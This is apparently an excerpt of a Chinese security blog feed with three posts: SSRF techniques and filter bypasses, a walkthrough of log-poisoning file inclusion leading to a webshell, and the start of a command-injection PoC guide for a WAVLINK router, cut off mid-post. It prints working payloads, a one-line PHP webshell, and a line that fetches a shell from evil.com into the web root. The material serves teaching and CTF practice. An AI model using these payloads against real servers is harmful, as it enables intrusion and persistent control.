function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>)); <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造一个前端页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;px&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/ss.php&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;commit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>请求非 HTTP 的端口可以返回 banner 信息。</p><p>或可利用 302 跳转绕过 HTTP 协议的限制。</p><p>辅助脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$port</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$scheme</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$scheme</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$data</span>&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h2><h4 id="Dict-协议"><a href="#Dict-协议" class="headerlink" title="Dict 协议"></a>Dict 协议</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dict:</span>//fuzz.wuyun<span class="hljs-meta">.org</span>:<span class="hljs-number">8080</span>/helo:dict<br></code></pre></td></tr></table></figure><h4 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">gopher:</span>//fuzz.wuyun<span class="hljs-meta">.org</span>:<span class="hljs-number">8080</span>/gopher<br></code></pre></td></tr></table></figure><h4 id="File-协议"><a href="#File-协议" class="headerlink" title="File 协议"></a>File 协议</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><ol><li>更改 IP 地址写法 例如<code>192.168.0.1</code><ul><li>8 进制格式：<code>0300.0250.0.1</code></li><li>16 进制格式：<code>0xC0.0xA8.0.1</code></li><li>10 进制整数格式：<code>3232235521</code></li><li>16 进制整数格式：<code>0xC0A80001</code></li><li>还有一种特殊的省略模式，例如<code>10.0.0.1</code>这个 IP 可以写成<code>10.1</code></li></ul></li><li>利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：<ul><li><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容</li><li>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1/</code></li><li>短地址<code>http://dwz.cn/11SMa</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1</code></li><li>利用句号<code>。</code>：<code>127。0。0。1</code>&#x3D;&#x3D;&gt;<code>127.0.0.1</code></li><li>添加端口混淆：<code>http://127.0.0.1:80@evil.com</code></li><li>利用<code>#</code>分割：<code>http://evil.com#@127.0.0.1</code></li><li>利用 Enclosed alphanumerics</li></ul></li></ol><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br><span class="hljs-symbol">List:</span><br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ <br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ <br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ <br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ <br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ <br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ <br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ <br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息;</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>对内网 web 应用进行指纹识别，通过访问默认文件实现;</li><li>攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）;</li><li>利用 file 协议读取本地文件等。</li></ul><h3 id="浏览器通过file-访问文件和http-访问文件的区别"><a href="#浏览器通过file-访问文件和http-访问文件的区别" class="headerlink" title="浏览器通过file:&#x2F;&#x2F;访问文件和http:&#x2F;&#x2F;访问文件的区别"></a>浏览器通过file:&#x2F;&#x2F;访问文件和http:&#x2F;&#x2F;访问文件的区别</h3><p>file协议用于访问本地计算机中的文件，好比通过资源管理器中打开文件一样，需要主要的是它是针对本地的，即file协议是<strong>访问你本机的文件资源。</strong></p><p>http访问本地的html文件，相当于<strong>将本机作为了一台http服务器，然后通过localhost访问的是你自己电脑上的本地服务器，再通过http服务器去访问你本机的文件资源。</strong></p><p>再简单点就是file只是简单请求了本地文件，将其作为一个服务器未解析的静态文件打开。而http是在本地搭建了一个服务器再通过服务器去动态解析拿到文件。</p><h2 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h2><ul><li><strong>file_get_contents()</strong>: 将整个文件或一个url所指向的文件读入一个字符串中</li><li><strong>readfile()</strong>: 输出一个文件的内容</li><li><strong>fsockopen()</strong>: 打开一个网络连接或者一个Unix套接字连接</li><li><strong>curl_exec()</strong>: 初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用</li><li><strong>fopen()</strong>: 打开一个文件文件或者URL</li><li><strong>PHP原生类SoapClient</strong>: 在触发反序列化时可导致SSRF</li></ul><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><ul><li><strong>file协议</strong>: 在有回显的情况下，利用file协议可以读取任意文件的内容</li><li><strong>dict协议</strong>: 泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li><strong>gopher协议</strong>: gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell</li><li><strong>http&#x2F;s协议</strong>: 探测内网主机存活</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol><li>让服务器访问相应的网址</li><li>让服务器访问自己所处内网的一些敏感文件来判断是否存在相应的应用</li><li>可以使用file、dict、gopher等协议进行请求访问相应的文件</li><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包(payload)）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>判断内网主机是否存活：方法是访问看是否有端口开放</li><li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li></ol>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2025/04/18/shell/"/>
    <url>/2025/04/18/shell/</url>
    
    <content type="html"><![CDATA[<h3 id="深入详解：WebShell-与日志文件包含攻击"><a href="#深入详解：WebShell-与日志文件包含攻击" class="headerlink" title="深入详解：WebShell 与日志文件包含攻击"></a>深入详解：WebShell 与日志文件包含攻击</h3><h4 id="一、什么是-WebShell？"><a href="#一、什么是-WebShell？" class="headerlink" title="一、什么是 WebShell？"></a>一、什么是 WebShell？</h4><p><strong>WebShell 本质</strong>：<br>一个隐藏在网站服务器上的恶意脚本文件，攻击者通过浏览器就能远程控制服务器，就像在服务器内部安装了”遥控器”。</p><p><strong>典型 WebShell 代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>访问方式：<code>http://target.com/shell.php?cmd=ls</code></li><li>效果：服务器会执行<code>ls</code>命令并返回结果</li></ul><p><strong>WebShell 的作用</strong>：</p><ol><li>执行系统命令（查看文件、修改配置）</li><li>上传&#x2F;下载文件</li><li>数据库操作</li><li>内网渗透跳板</li><li>持久化后门（即使漏洞修复仍能控制）</li></ol><h4 id="二、你提供的攻击流程详解"><a href="#二、你提供的攻击流程详解" class="headerlink" title="二、你提供的攻击流程详解"></a>二、你提供的攻击流程详解</h4><h5 id="完整攻击步骤："><a href="#完整攻击步骤：" class="headerlink" title="完整攻击步骤："></a>完整攻击步骤：</h5><pre><code class=" mermaid">graph TDA[污染日志] --&gt; B[包含日志]B --&gt; C[执行代码]C --&gt; D[获取WebShell]D --&gt; E[完全控制服务器]</code></pre><h5 id="详细解析："><a href="#详细解析：" class="headerlink" title="详细解析："></a>详细解析：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><p><strong>步骤分解</strong>：</p><ol><li><p><strong>污染日志（植入代码）</strong><br>首先需要让日志包含PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/&lt;?php</span> $_<span class="hljs-keyword">GET</span>[&#x27;2&#x27;]);?&gt; <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> target.com<br></code></pre></td></tr></table></figure><p>日志会记录：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">[2025-06-11] &quot;GET /</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 404 ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>触发代码执行</strong><br>访问包含漏洞页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">target.com/vuln.php?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure></li><li><p><strong>服务器实际执行的代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /var/www/html/fl0g.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>system(&#39;tac ...&#39;)</code>：执行系统命令读取flag文件</li><li><code>phpinfo()</code>：输出PHP配置信息</li></ul></li><li><p><strong>结果定位技巧</strong>：<br>在返回的网页中：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">FLAG</span><span class="hljs-template-variable">&#123;this_is_secret&#125;</span><span class="language-xml">  &lt;-- 命令执行结果</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo()的起始标签</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PHP信息<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">...</span><br></code></pre></td></tr></table></figure><p>只需在<code>&lt;!DOCTYPE html&gt;</code>前面查找就能看到命令执行结果</p></li></ol><h4 id="三、如何升级为完整-WebShell"><a href="#三、如何升级为完整-WebShell" class="headerlink" title="三、如何升级为完整 WebShell"></a>三、如何升级为完整 WebShell</h4><h5 id="方法1：直接写入-WebShell"><a href="#方法1：直接写入-WebShell" class="headerlink" title="方法1：直接写入 WebShell"></a>方法1：直接写入 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php system($_GET[0]);?&gt;&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><ul><li>效果：创建 <code>shell.php</code> 后门文件</li><li>使用：<code>http://target.com/shell.php?0=ls</code></li></ul><h5 id="方法2：下载现成-WebShell"><a href="#方法2：下载现成-WebShell" class="headerlink" title="方法2：下载现成 WebShell"></a>方法2：下载现成 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;wget http://evil.com/shell.txt -O /var/www/html/shell.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><h5 id="方法3：使用专业工具连接"><a href="#方法3：使用专业工具连接" class="headerlink" title="方法3：使用专业工具连接"></a>方法3：使用专业工具连接</h5><ol><li>写入 WebShell 后</li><li>使用中国蚁剑&#x2F;冰蝎连接：<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">连接<span class="hljs-built_in">URL</span>：<span class="hljs-keyword">http</span>://target.com/<span class="hljs-built_in">shell</span>.php<br>密码：cmd（根据WebShell代码设定）<br></code></pre></td></tr></table></figure><img src="https://example.com/antsword.jpg" alt="蚁剑界面示例"></li></ol><h4 id="四、为什么需要这样操作？"><a href="#四、为什么需要这样操作？" class="headerlink" title="四、为什么需要这样操作？"></a>四、为什么需要这样操作？</h4><ol><li><p><strong>绕过防御</strong>：</p><ul><li>当直接上传文件被禁止时</li><li>当常见协议（php:&#x2F;&#x2F;, data:&#x2F;&#x2F;）被过滤时</li></ul></li><li><p><strong>隐蔽性强</strong>：</p><ul><li>日志文件是合法系统文件</li><li>不会新增可疑文件（无文件落地）</li></ul></li><li><p><strong>多阶段攻击</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">攻击者-&gt;服务器: 污染日志<br>攻击者-&gt;服务器: 触发包含漏洞<br>服务器--&gt;攻击者: 返回命令结果<br>攻击者-&gt;服务器: 部署WebShell<br>服务器--&gt;攻击者: 持久控制通道<br></code></pre></td></tr></table></figure></li></ol><h4 id="五、实际案例演示"><a href="#五、实际案例演示" class="headerlink" title="五、实际案例演示"></a>五、实际案例演示</h4><p>假设目标网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//vuln-site.com/index.php?page=about.php</span><br></code></pre></td></tr></table></figure><p><strong>攻击过程</strong>：</p><ol><li><p>检测LFI漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>etc/passwd<br></code></pre></td></tr></table></figure></li><li><p>污染日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://vuln-site.com/&lt;?php system(\$_GET[&#x27;exec&#x27;]);?&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>执行命令（查找flag）：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://vuln-site.com/<span class="hljs-built_in">index</span>.php?page=/var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span>&amp;exec=find / -<span class="hljs-keyword">name</span> flag*<br></code></pre></td></tr></table></figure></li><li><p>结果定位：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">/var/secret/flag.txt  &lt;-- 命令输出<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo起始标记<br></code></pre></td></tr></table></figure></li><li><p>读取flag：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>var<span class="hljs-regexp">/log/</span>nginx<span class="hljs-regexp">/access.log&amp;exec=cat /</span>var<span class="hljs-regexp">/secret/</span>flag.txt<br></code></pre></td></tr></table></figure></li></ol><h4 id="六、防御措施"><a href="#六、防御措施" class="headerlink" title="六、防御措施"></a>六、防御措施</h4><ol><li><p><strong>服务器防护</strong>：</p><ul><li>设置 <code>open_basedir</code> 限制文件访问范围</li><li>禁用危险函数：<code>system, exec, shell_exec</code></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">disable_functions</span> = system,exec,passthru<br></code></pre></td></tr></table></figure></li><li><p><strong>日志安全</strong>：</p><ul><li>将日志移出Web目录</li><li>设置日志文件不可执行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i /var/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p><strong>代码层面</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 安全的文件包含</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;about&#x27;</span>,<span class="hljs-string">&#x27;contact&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>入侵检测</strong>：</p><ul><li>监控异常日志条目（包含<code>&lt;?php</code>的请求）</li><li>使用WAF过滤包含特殊字符的请求</li></ul></li></ol><p>这种攻击方式巧妙利用了服务器自身的日志功能，即使在没有文件上传漏洞的情况下也能实现完全控制，是LFI漏洞中最危险的利用方式之一。</p><p>直接通过get请求写马会导致代码被URL编码，导致日志中存储的是编码后的文本，不是可执行代码。UA头不会被编码</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>POC</title>
    <link href="/2025/04/17/POC/"/>
    <url>/2025/04/17/POC/</url>
    
    <content type="html"><![CDATA[<p>编写一个漏洞的 Proof of Concept (PoC)，并以 <strong>CVE-2022-34577 (WAVLINK WN535 G3 命令注入)</strong> 作为完美案例。</p><hr><h3 id="第一步：理解漏洞（情报分析）"><a href="#第一步：理解漏洞（情报分析）" class="headerlink" title="第一步：理解漏洞（情报分析）"></a>第一步：理解漏洞（情报分析）</h3><p>在写任何代码之前，必须先彻底搞懂这个漏洞。我们从 <code>info</code> 块中提取关键情报：</p><ul><li><strong>漏洞名称 (Name):</strong> Command Execution in WAVLINK WN535 G3 adm.cgi<ul><li><strong>解读：</strong> 这是一个<strong>命令执行</strong>漏洞。意味着我们可以让设备执行我们想要的操作系统命令。</li></ul></li><li><strong>触发点 (Description):</strong> “via a crafted POST request” to “adm.cgi”<ul><li><strong>解读：</strong> 漏洞是通过向 <code>/adm.cgi</code> 这个路径发送一个特制的 <strong>POST 请求</strong>来触发的。</li></ul></li><li><strong>影响 (Impact):</strong> Remote Code Execution (RCE)<ul><li><strong>解读：</strong> 危害极高，可以完全控制设备。</li></ul></li></ul><p><strong>小结：</strong> 我们的目标是，向目标设备的 <code>/adm.cgi</code> 发送一个POST请求，这个请求的 body 中要包含我们想执行的命令。</p><hr><h3 id="第二步：找到注入点和载荷（寻找作案工具）"><a href="#第二步：找到注入点和载荷（寻找作案工具）" class="headerlink" title="第二步：找到注入点和载荷（寻找作案工具）"></a>第二步：找到注入点和载荷（寻找作案工具）</h3><p>现在我们知道要在 <code>/adm.cgi</code> 上“动手脚”，但具体怎么做？</p><ul><li><p><strong>注入点 (Injection Point):</strong><br>漏洞的描述是“特制的POST请求”，但没说是哪个参数。这时，我们可以从 Nuclei 模板的 <code>body</code> 部分找到线索：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">body: &quot;cmd=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">base64</span>(<span class="hljs-name">&#x27;id&#x27;</span>)&#125;&#125;</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>这行代码揭示了最关键的信息：</p><ol><li>存在一个名为 <strong><code>cmd</code></strong> 的参数。这就是我们的<strong>注入点</strong>。</li><li>传递给 <code>cmd</code> 参数的内容需要进行 <strong>Base64 编码</strong>。这是一个常见的绕过技巧。</li></ol></li><li><p><strong>选择一个无害的载荷 (Payload):</strong><br>PoC 的目的是“证明”漏洞存在，而不是破坏系统。因此，我们必须选择一个<strong>安全、无害、有明显回显</strong>的命令。</p><ul><li><strong><code>id</code> 命令：</strong> 这是最佳选择之一。在所有 Linux&#x2F;Unix 系统上都存在，执行后会返回当前用户的ID信息，如 <code>uid=0(root) gid=0(root)</code>。它的输出非常独特，易于识别。</li><li><strong><code>whoami</code> 命令：</strong> 同样优秀，返回当前用户名。</li><li><strong><code>sleep 5</code> 命令：</strong> 用于<strong>盲注</strong>。如果你无法直接看到命令的输出，可以通过判断服务器响应是否延迟了5秒来确认命令是否执行。</li></ul></li></ul><p><strong>小结：</strong> 我们的作案手法是，构造一个 POST 请求，其 body 为 <code>cmd=&lt;base64编码后的&#39;id&#39;命令&gt;</code>。</p><hr><h3 id="第三步：编写-PoC（多种形式的作案演练）"><a href="#第三步：编写-PoC（多种形式的作案演练）" class="headerlink" title="第三步：编写 PoC（多种形式的作案演练）"></a>第三步：编写 PoC（多种形式的作案演练）</h3><p>现在，我们将以上分析转化为实际可执行的代码。一个 PoC 可以有多种形式，从简单到复杂。</p><h4 id="形式一：最简单的-PoC-使用-curl"><a href="#形式一：最简单的-PoC-使用-curl" class="headerlink" title="形式一：最简单的 PoC - 使用 curl"></a>形式一：最简单的 PoC - 使用 <code>curl</code></h4><p><code>curl</code> 是网络调试的瑞士军刀，是编写 PoC 最快的方式。</p><ol><li><p><strong>准备载荷:</strong> <code>id</code> 命令的 Base64 编码是 <code>aWQ=</code>。</p><ul><li>在 Linux&#x2F;Mac 上用命令 <code>echo -n &quot;id&quot; | base64</code> 来获取。</li></ul></li><li><p><strong>编写 <code>curl</code> 命令:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -X POST: 指定使用 POST 方法</span><br><span class="hljs-comment"># -H &quot;Content-Type...&quot;: 指定请求头，这在处理表单数据时通常是必需的</span><br><span class="hljs-comment"># -d &quot;cmd=aWQ=&quot;: 指定 POST 请求的 body 内容</span><br><span class="hljs-comment"># http://&lt;TARGET_IP&gt;/adm.cgi: 目标 URL</span><br><br>curl -X POST \<br>  -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> \<br>  -d <span class="hljs-string">&quot;cmd=aWQ=&quot;</span> \<br>  http://&lt;TARGET_IP&gt;/adm.cgi<br></code></pre></td></tr></table></figure></li><li><p><strong>验证结果:</strong> 